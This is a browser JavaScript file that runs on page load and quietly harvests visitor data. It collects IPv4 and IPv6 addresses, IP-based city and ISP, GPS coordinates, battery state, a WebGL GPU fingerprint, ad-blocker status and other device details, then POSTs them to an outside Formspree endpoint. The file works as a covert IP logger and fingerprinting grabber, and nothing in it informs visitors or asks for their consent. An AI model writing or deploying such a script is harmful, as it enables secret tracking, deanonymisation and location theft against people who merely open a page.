let canRunAds = true;

function detectAndroidVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/Android\s([0-9\.]+)/i);
    return match ? "Android " + match[1] : "Not Android";
}

function getOS() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
    if (/Windows Phone/i.test(ua)) return "Windows Phone";
    if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
    if (ua.includes("Windows NT")) return "Windows";
    if (ua.includes("Mac OS")) return "MacOS";
    if (ua.includes("CrOS")) return "ChromeOS"; 
    if (ua.includes("Linux")) return "Linux";
    if (ua.includes("FreeBSD")) return "FreeBSD";
    if (ua.includes("OpenBSD")) return "OpenBSD";
    if (ua.includes("NetBSD")) return "NetBSD";
    if (ua.includes("SunOS")) return "Solaris";
    return "Unknown OS";
}

function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "Unavailable";
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic WebGL";
    } catch (e) {
        return "Blocked/Unavailable";
    }
}

async function getIPData() {
    let ipv4 = "Not Detected";
    let ipv6 = "Not Detected";
    let geo = { country: "Unavailable", city: "", org: "Unavailable" };

    try {
        const res4 = await fetch("https://api.ipify.org?format=json").catch(() => null);
        if (res4) {
            const data4 = await res4.json();
            ipv4 = data4.ip;
        }

        const res6 = await fetch("https://api6.ipify.org?format=json").catch(() => null);
        if (res6) {
            const data6 = await res6.json();
            ipv6 = data6.ip;
        }

        const resGeo = await fetch("https://ipapi.co/json/").catch(() => null);
        if (resGeo) {
            const dataGeo = await resGeo.json();
            geo.country = dataGeo.country_name || "Unavailable";
            geo.city = dataGeo.city || "";
            geo.org = dataGeo.org || "Unavailable";
        }
    } catch (error) {
        console.warn("IP collection partially blocked.");
    }

    return {
        combinedIP: `IPv4: ${ipv4} | IPv6: ${ipv6}`,
        country: geo.country,
        city: geo.city,
        org: geo.org
    };
}

async function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            resolve({ lat: "Not Supported", lon: "Not Supported" });
            return;
        }
        navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            err => resolve({ lat: "Denied/Error", lon: "Denied/Error" }),
            { timeout: 5000 }
        );
    });
}

async function getBatteryInfo() {
    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            return { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
        }
        return "Not Supported";
    } catch (e) {
        return "Blocked";
    }
}

async function checkAdBlocker() {
    return new Promise(resolve => {
        const testAd = document.createElement('div');
        testAd.innerHTML = '&nbsp;';
        testAd.className = 'adsbox'; 
        testAd.style.position = 'absolute';
        testAd.style.left = '-999px';
        document.body.appendChild(testAd);

        window.setTimeout(() => {
            const isBlocked = testAd.offsetHeight === 0;
            testAd.remove();
            resolve(isBlocked ? "Enabled" : "Disabled");
        }, 150);
    });
}

async function collect() {
    const ipData = await getIPData();
    const gps = await getGPS();
    const battery = await getBatteryInfo();
    const adBlockStatus = await checkAdBlocker();
    const currentOS = getOS();
    const androidVer = detectAndroidVersion();

    return {
        TIME: new Date().toString(),
        IP_ADDRESSES: ipData.combinedIP, // Now shows both
        LOCATION: `${ipData.country} ${ipData.city}`.trim(),
        ISP: ipData.org,
        GPS_LATITUDE: gps.lat,
        GPS_LONGITUDE: gps.lon,
        BATTERY_INFO: JSON.stringify(battery),
        AD_BLOCKER: adBlockStatus,
        BROWSER: navigator.userAgent,
        OS: currentOS,
        Android_V: androidVer,
        SCREEN: `${screen.width}x${screen.height}`,
        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
        LANGUAGE: navigator.language,
        GPU: getGPU(),
        PLATFORM: (currentOS === "Android") ? androidVer : navigator.platform,
        TOUCH: navigator.maxTouchPoints > 0 ? "Yes" : "No",
        REFERRER: document.referrer || "Direct"
    };
}

async function sendData() {
    const data = await collect();
    console.log("Data Collected:", data); 

    try {
        const response = await fetch("https://formspree.io/f/maqpoaly", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        if (response.ok) {
            console.log("Submission successful");
        }
    } catch (e) {
        console.error("Transmission failed.");
    }
}

window.addEventListener('load', sendData);
